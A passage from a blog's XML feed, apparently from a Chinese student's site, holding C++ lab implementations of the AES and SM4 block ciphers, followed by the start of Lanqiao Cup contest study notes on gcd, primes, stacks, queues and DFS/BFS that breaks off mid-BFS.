0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}        };//逆S盒uint8_t Inv_S_Box[16][16] =        {                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}        };//轮密钥加uint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};uint32_t left_bit_move(uint32_t val, int n) {    uint32_t size = sizeof(val) * 8;    n = n % size;    return (val &gt;&gt; (size - n) | (val &lt;&lt; n));//左移    //return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移}string string_to_hex(const string&amp; str) //字符串转化为十六进制{    string result="";    string tmp;    stringstream ss;    for(int i=0;i&lt;str.size();i++)    {        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;        ss&gt;&gt;tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string&amp; str){    std::string result;    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}//制作列混淆表uint8_t Mul_02(uint8_t x){    if((x&gt;&gt;7) == 0)        return x&lt;&lt;1;    else        return ((x&lt;&lt;1)^0x1b)&amp;0xff;}uint32_t get_output_col1(uint8_t x){    x = (uint32_t)x;    return (Mul_02(x)&lt;&lt;24)|(x&lt;&lt;16)|(x&lt;&lt;8)|(x^ Mul_02(x));    //2113}uint32_t get_output_col2(uint8_t x){    x = (uint32_t)x;    return ((x^Mul_02(x))&lt;&lt;24)|(Mul_02(x)&lt;&lt;16)|(x&lt;&lt;8)|(x);    //3211}uint32_t get_output_col3(uint8_t x){    x = (uint32_t)x;    return (x&lt;&lt;24)|((x^Mul_02(x))&lt;&lt;16)|(Mul_02(x)&lt;&lt;8)|(x);    //1321}uint32_t get_output_col4(uint8_t x){    x = (uint32_t)x;    return (x&lt;&lt;24)|(x&lt;&lt;16)|((x^Mul_02(x))&lt;&lt;8)|(Mul_02(x));    //1132}void get_TAB(){    for(int i=0;i&lt;4;i++) {        for (int j = 0; j &lt; 256; j++) {            T[i][j]=0;        }    }    for(int i=0;i&lt;256;i++) {        T[0][i] = get_output_col1((uint8_t) i);        T[1][i] = get_output_col2((uint8_t) i);        T[2][i] = get_output_col3((uint8_t) i);        T[3][i] = get_output_col4((uint8_t) i);    }    //输出列混淆表//    for(int i=0;i&lt;4;i++) {//        for (int j = 0; j &lt; 256; j++) {//            //printf("%8x ",T[i][j]);//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; " ";//        }//        cout&lt;&lt;endl;//    }}uint8_t GFMul(uint8_t a, uint8_t b) {    uint8_t p = 0;    uint8_t high;    for (int counter = 0; counter &lt; 8; counter++)    {        if ((b &amp; uint8_t(1)) != 0){//判断当前b的最后一位是否为0            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a        high = (uint8_t) (a &amp; uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出        a &lt;&lt;= 1;//a左移一位，即乘以2        if (high != 0){//发生溢出            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1        b &gt;&gt;= 1;//右移，看b的下一位了    }    return p;}void KeyExpansion(uint8_t key[], uint32_t w[]){    int j=0;    uint32_t temp=0;    // w[]的前4个就是输入的key    //初始化w[0]-&gt;w[3]    for(int i=0; i&lt;4;i++){        w[i] = (key[4*i]&lt;&lt;24)|(key[4*i+1]&lt;&lt;16)|(key[4*i+2]&lt;&lt;8)|(key[4*i+3]);        //printf("%d:%x\n",i,w[i]);    }    //创建w[4]-&gt;w[43]    for(int i=4; i&lt;44;i++){        if(i%4==0){            temp = left_bit_move(w[i-1],8);//循环左移8位            temp =  SubKeys(temp);            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];            //printf("%d:%x\n",i,w[i]);        }        else {            w[i] = w[i - 1] ^ w[i - 4];            //printf("%d:%x\n",i,w[i]);        }    }}void AddRoundKey(uint8_t mtx[],uint32_t w[]){    for(int i=0; i&lt;4; i++){        uint8_t w1 = w[i] &gt;&gt; 24 &amp; 0xff;        uint8_t w2 = (w[i] &gt;&gt; 16) &amp; 0xff;        uint8_t w3 = (w[i] &gt;&gt; 8) &amp; 0xff;        uint8_t w4 = (w[i]) &amp; 0xff;        mtx[i] ^= w1;  //按列异或        mtx[i+4] ^= w2;        mtx[i+8] ^= w3;        mtx[i+12] ^= w4;    }}//  S盒密钥变换 - 前4位为行号，后4位为列号uint32_t SubKeys(uint32_t temp){    uint8_t w[4] = {0};    int j=0;    //循环4次    for(int i=3; i&gt;=0; i--){        w[j++] = (temp&gt;&gt;(i*8))&amp;0xff;    }    SubBytes(w,4);    return (w[0]&lt;&lt;24|w[1]&lt;&lt;16|w[2]&lt;&lt;8|w[3]);}//  S盒变换 - 前4位为行号，后4位为列号void SubBytes(uint8_t mtx[],int len){    for(int i=0; i&lt;len; ++i)    {        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列        mtx[i] = S_Box[row][col];    }}void InvSubBytes(uint8_t mtx[],int len){    for(int i=0; i&lt;len; ++i)    {        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列        mtx[i] = Inv_S_Box[row][col];    }}//行移位void ShiftRows(uint8_t mtx[]){    uint8_t temp=mtx[4];    //第二行左移一位    for(int i=0; i&lt;3; i++){        mtx[i+4] = mtx[i+5];    }    mtx[7] = temp;    //第三行左移二位    for(int i=0; i&lt;2; i++){        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    //第四行左移三位    temp = mtx[15];    for(int i=3; i&gt;0; i--) {        mtx[i + 12] = mtx[i + 11];    }    mtx[12] = temp;}void InvShiftRows(uint8_t mtx[]){    // 第二行循环右移一位    uint8_t temp = mtx[7];    for(int i=3; i&gt;0; --i)        mtx[i+4] = mtx[i+3];    mtx[4] = temp;    // 第三行循环右移两位    for(int i=0; i&lt;2; ++i)    {        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    // 第四行循环右移三位    temp = mtx[12];    for(int i=0; i&lt;3; ++i)        mtx[i+12] = mtx[i+13];    mtx[15] = temp;}void MixColumns(uint8_t c[]){    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列    for(int i=0;i&lt;16;i++){        temp[i] = T[i/4][c[i]];    }    for(int i=0; i&lt;4;i++) {        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];        c[i] = (total[i]&gt;&gt;24)&amp;0xff;        c[i+4]=(total[i]&gt;&gt;16)&amp;0xff;        c[i+8] = (total[i]&gt;&gt;8)&amp;0xff;        c[i+12] = (total[i])&amp;0xff;    }}void InvMixColumns(uint8_t mtx[]){    uint8_t arr[4];    for(int i=0; i&lt;4; ++i) {        for (int j = 0; j &lt; 4; ++j)            arr[j] = mtx[i + j * 4];        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);    }}void Encrypt(uint8_t m[],uint32_t key[],uint8_t c[]){    //首先进行开始的轮密钥加    int round=0;    uint32_t w[4]={0};    for(int k=0; k&lt;4; k++)        w[k] = key[4*round+k];    for(int i=0; i&lt;16; i++)        c[i] = m[i];    AddRoundKey(c,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i&lt;=9;i++)    {        SubBytes(c,16);//字节替代        ShiftRows(c);//行移位        MixColumns(c);//列混淆        round++;        //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;        for(int k=0; k&lt;4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(c,w);//轮密钥加    }    //最后一轮    round++;    //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;    for(int k=0; k&lt;4; k++) {        w[k] = key[4 * round + k];        //("%x ",w[k]);    }    SubBytes(c,16);//字节替代    ShiftRows(c);//行移位    AddRoundKey(c,w);//轮密钥加}void Decrypt(uint8_t c[],uint32_t key[],uint8_t m[]){    //首先进行开始的轮密钥加    //注意密钥反着来    int round=10;    uint32_t w[4]={0};    for(int k=0; k&lt;4; k++)        w[k] = key[4*round+k];  //密钥赋值    for(int i=0; i&lt;16; i++)        m[i] = c[i];    AddRoundKey(m,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i&lt;=9;i++)    {        InvShiftRows(m);//行移位        InvSubBytes(m,16);//字节替代        round--;        //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;        for(int k=0; k&lt;4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(m,w);//轮密钥加        InvMixColumns(m);//列混淆    }    //最后一轮    round--;    //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;    for(int k=0; k&lt;4; k++) {        w[k] = key[4 * round + k];        //("%x ",w[k]);    }    InvShiftRows(m);//行移位    InvSubBytes(m,16);//字节替代    AddRoundKey(m,w);//轮密钥加}void Display(uint8_t Matrix[]){    for(int i=0; i&lt;16; i++) {        printf("%x ", Matrix[i]);        if(i%4==3)            cout&lt;&lt;endl;    }}void DisplayKeys(uint32_t Matrix[]){    for(int i=0; i&lt;44; i++) {        printf("第%d列:%x\n",i,Matrix[i]);    }}int main(){    string mingwen;    string miwen;    uint8_t key[16]={0};    uint8_t m[16]={0};    cout&lt;&lt;"请输入明文(128bits):";    cin&gt;&gt;mingwen;    cout&lt;&lt;"请输入密文(128bits):";    cin&gt;&gt;miwen;    for(int i=0;i&lt;16;i++)    {        m[i] = (uint8_t)(mingwen[i]);        key[i] = (uint8_t)(miwen[i]);    }    uint8_t c[16]={0};    uint8_t x[16]={0};    uint32_t new_key[44]={0};   //存储44列密钥    cout&lt;&lt;"明文:"&lt;&lt;endl;    Display(m);    cout&lt;&lt;"密钥:"&lt;&lt;endl;    Display(key);    get_TAB();//生成列混淆表    KeyExpansion(key,new_key);    cout&lt;&lt;"生成密钥"&lt;&lt;endl;    //DisplayKeys(new_key);    Encrypt(m,new_key,c);    cout&lt;&lt;"加密结果"&lt;&lt;endl;    Display(c);    Decrypt(c,new_key,x);    cout&lt;&lt;"解密结果(hex)"&lt;&lt;endl;    Display(x);    cout&lt;&lt;"解密结果(string)"&lt;&lt;endl;    for(int i=0;i&lt;16;i++)        cout&lt;&lt;(char)x[i];    return 0;}</code></pre><h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><pre><code class="language-c++">#include "string.h"#include&lt;iostream&gt;#include &lt;stdint.h&gt;#include&lt;string&gt;using namespace std;uint32_t shift_l(uint32_t s,int n)//循环左移n位{    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位    return s&lt;&lt;(n)|(s&gt;&gt;size-n);}uint32_t Sb(uint32_t s) {    uint8_t SboxTable[16][16] =            {                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};    uint8_t a[4];    a[0]=(s&gt;&gt;24)&amp;0xff;     //最高8位    a[1]=(s&gt;&gt;16)&amp;0xff;    a[2]=(s&gt;&gt;8)&amp;0xff;    a[3]=s&amp;0xff;    uint8_t b[4];    for(int i=0;i&lt;4;i++) {        int row = ((a[i] &gt;&gt; 7) &amp; 1) * 8 + ((a[i] &gt;&gt; 6) &amp; 1) * 4 + ((a[i] &gt;&gt; 5) &amp; 1) * 2 + ((a[i] &gt;&gt; 4) &amp; 1) * 1;        int col = ((a[i] &gt;&gt; 3) &amp; 1) * 8 + ((a[i] &gt;&gt; 2) &amp; 1) * 4 + ((a[i] &gt;&gt; 1) &amp; 1) * 2 + ((a[i]) &amp; 1) * 1;        b[i] = SboxTable[row][col];    }    uint32_t result;    result=(b[0]&lt;&lt;24)|(b[1]&lt;&lt;16)|(b[2]&lt;&lt;8)|b[3];    return result;}uint32_t L_change(uint32_t s){    return s^ shift_l(s,13)^ shift_l(s,23);}uint32_t T_change(uint32_t s){    return L_change(Sb(s));}void keyexpand(uint32_t MK[4],uint32_t rk[32]){    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};    uint32_t K[36];    for(int i=0;i&lt;=3;i++)        K[i]=k[i];    for(int i=0;i&lt;32;i++)    {        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);    }    for(int i=0;i&lt;32;i++)        rk[i]=K[i+4];}uint32_t Lchange(uint32_t s){    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);}uint32_t Tchange(uint32_t s){    return Lchange(Sb(s));}uint32_t fround(uint32_t X[4],uint32_t rk){    uint32_t B=X[1]^X[2]^X[3]^rk;    return X[0]^ L_change(Sb(B));}static uint32_t out1[4];void SM4(uint32_t X[4],uint32_t rk[32]){    uint32_t Y[36];    Y[0]=X[0];    Y[1]=X[1];    Y[2]=X[2];    Y[3]=X[3];    for(int i=0;i&lt;=31;i++) {        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);    }//    for(int i=0;i&lt;36;i++) {//        printf("第%d轮:%x \n",i,Y[i]);//    }    out1[0]=Y[35];    out1[1]=Y[34];    out1[2]=Y[33];    out1[3]=Y[32];}static uint32_t out2[4];void sm4(uint32_t Y[4],uint32_t rk[32]){    uint32_t X[36];    X[35]=Y[0];    X[34]=Y[1];    X[33]=Y[2];    X[32]=Y[3];    for(int i=31;i&gt;=0;i--)    {        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);    }    out2[0]=X[0];    out2[1]=X[1];    out2[2]=X[2];    out2[3]=X[3];}int main() {    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout&lt;&lt;"明文:"&lt;&lt;endl;    for(int i=0;i&lt;4;i++)        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;" ";    cout&lt;&lt;endl;    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout&lt;&lt;"密钥："&lt;&lt;endl;    for(int i=0;i&lt;4;i++)        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;" ";    cout&lt;&lt;endl;    uint32_t rk[32];    keyexpand(MK,rk);//    cout&lt;&lt;"扩展密钥："&lt;&lt;endl;//    for(int i=0;i&lt;32;i++)//        cout&lt;&lt;i&lt;&lt;"轮扩展密钥"&lt;&lt;rk[i]&lt;&lt;endl;    cout&lt;&lt;"加密结果："&lt;&lt;endl;    SM4(ming,rk);    for(int i=0;i&lt;4;i++)        cout&lt;&lt;out1[i]&lt;&lt;" ";    cout&lt;&lt;endl;    cout&lt;&lt;"解密结果:"&lt;&lt;endl;    sm4(out1,rk);    for(int i=0;i&lt;4;i++)        cout&lt;&lt;out2[i]&lt;&lt;" ";    cout&lt;&lt;endl;    return 0;}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DES&quot;&gt;&lt;a href=&quot;#DES&quot; class=&quot;headerlink&quot; title=&quot;DES&quot;&gt;&lt;/a&gt;DES&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-C++&quot;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;
using</summary>
      
    
    
    
    
    <category term="密码学实验代码集合" scheme="https://kylinxin.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81%E9%9B%86%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯</title>
    <link href="https://kylinxin.github.io/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://kylinxin.github.io/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-05-05T12:05:49.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1>救赎</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"><a href="#1-欧几里得辗转相除法-求解-最大公约数-最小公倍数" class="headerlink" title="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"></a>1.欧几里得辗转相除法 求解 最大公约数 最小公倍数</h3><pre><code class="language-c++">int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}int lcm(int a, int b){return a / gcd(a, b) * b;}</code></pre><h3 id="2-求质数"><a href="#2-求质数" class="headerlink" title="2-求质数"></a>2.求质数</h3><pre><code class="language-c++">/* 判断素数 */bool isPrime(LL n) {for (int i = 2; i * i &lt;= n; ++i)if (n % i == 0)return false;return true;}</code></pre><h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3-栈"></a>3.栈</h3><pre><code class="language-c++">#include &lt;stack&gt;stack&lt;类型&gt; mystack;s.empty();         //如果栈为空则返回true, 否则返回false;s.size();          //返回栈中元素的个数s.top();           //返回栈顶元素, 但不删除该元素s.pop();           //弹出栈顶元素, 但不返回其值s.push();          //将元素压入栈顶</code></pre><h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4-队列"></a>4.队列</h3><pre><code class="language-c++">#include &lt;queue&gt;queue&lt;类型&gt; myqueue;push() //在队尾插入一个元素pop() //删除队列第一个元素size() //返回队列中元素个数empty() //如果队列空则返回truefront() //返回队列中的第一个元素back() //返回队列中最后一个元素</code></pre><h3 id="5-DFS-深度优先"><a href="#5-DFS-深度优先" class="headerlink" title="5-DFS-深度优先"></a>5.DFS(深度优先)</h3><pre><code class="language-c++">int dx[4] = {0,0,-1,1};int dy[4] = {-1,1,0,0};int mp[N][N];//存放迷宫int vis[N][N];//表示是否访问过，初始为flasevoid DFS(int x, int y)//x,y是坐标点的位置 {if(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口vis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过for(int i=0; i &lt; 4; i++){//遍历四个方向，顺序依次是，上下左右int nx = x + dx[i];int ny = y + dy[i];      //进行了合法性检验，      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续if(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')dfs(nx,ny);} }//注意!! 应该判断一下起点是否可走</code></pre><h3 id="6-BFS-广度优先搜索"><a href="#6-BFS-广度优先搜索" class="headerlink" title="6-BFS-广度优先搜索"></a>6.BFS(广度优先搜索)</h3><pre><code class="language-c++">int X[4]={0, 0, -1, 1};int Y[4]={-1, 1, 0, 0};int matrix[N][N]; //存储迷宫信息int vis[N][N];//存储每个状态点是否走过struct node{int x;int y;}Node, top;bool judge(int xx, int yy){if(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界return 